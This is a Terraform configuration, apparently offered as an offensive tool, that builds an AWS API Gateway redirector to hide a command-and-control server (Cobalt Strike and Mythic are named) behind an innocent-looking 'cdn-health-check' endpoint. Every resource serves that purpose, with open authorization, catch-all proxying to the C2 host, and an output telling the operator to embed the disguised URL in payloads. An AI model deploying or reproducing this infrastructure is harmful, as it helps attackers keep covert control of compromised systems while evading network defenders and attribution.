# ==============================================================================
# 🍯 Operation Molasses - Stealth C2 Redirector (APT-Level Concept)
# Author: Zencefil Efendi
# Description: Masks the real C2 server behind an AWS API Gateway / CloudFront
# ==============================================================================

provider "aws" {
  region = "us-east-1"
}

# The Real Command and Control Server (Hidden)
variable "c2_server_url" {
  description = "The HTTP/HTTPS URL of your actual C2 Server (e.g., Mythic, Cobalt Strike)"
  default     = "https://hidden-c2-server.com"
}

# Create an API Gateway REST API to act as a proxy
resource "aws_api_gateway_rest_api" "stealth_c2_proxy" {
  name        = "cdn-health-check" # Innocent looking name
  description = "Cloud Delivery Network Health Check Proxy"
}

# Catch-all resource
resource "aws_api_gateway_resource" "proxy" {
  rest_api_id = aws_api_gateway_rest_api.stealth_c2_proxy.id
  parent_id   = aws_api_gateway_rest_api.stealth_c2_proxy.root_resource_id
  path_part   = "{proxy+}"
}

# Any method (GET, POST) allowed
resource "aws_api_gateway_method" "proxyMethod" {
  rest_api_id   = aws_api_gateway_rest_api.stealth_c2_proxy.id
  resource_id   = aws_api_gateway_resource.proxy.id
  http_method   = "ANY"
  authorization = "NONE"
}

# Forward the request to the real C2 server
resource "aws_api_gateway_integration" "proxyIntegration" {
  rest_api_id             = aws_api_gateway_rest_api.stealth_c2_proxy.id
  resource_id             = aws_api_gateway_resource.proxy.id
  http_method             = aws_api_gateway_method.proxyMethod.http_method
  type                    = "HTTP_PROXY"
  integration_http_method = "ANY"
  uri                     = "${var.c2_server_url}/{proxy}"
}

# Deploy the API
resource "aws_api_gateway_deployment" "stealth_deployment" {
  depends_on  = [aws_api_gateway_integration.proxyIntegration]
  rest_api_id = aws_api_gateway_rest_api.stealth_c2_proxy.id
  stage_name  = "api"
}

output "stealth_redirector_url" {
  value = aws_api_gateway_deployment.stealth_deployment.invoke_url
  description = "Use this innocent AWS URL in your payloads. It will route traffic to your hidden C2."
}
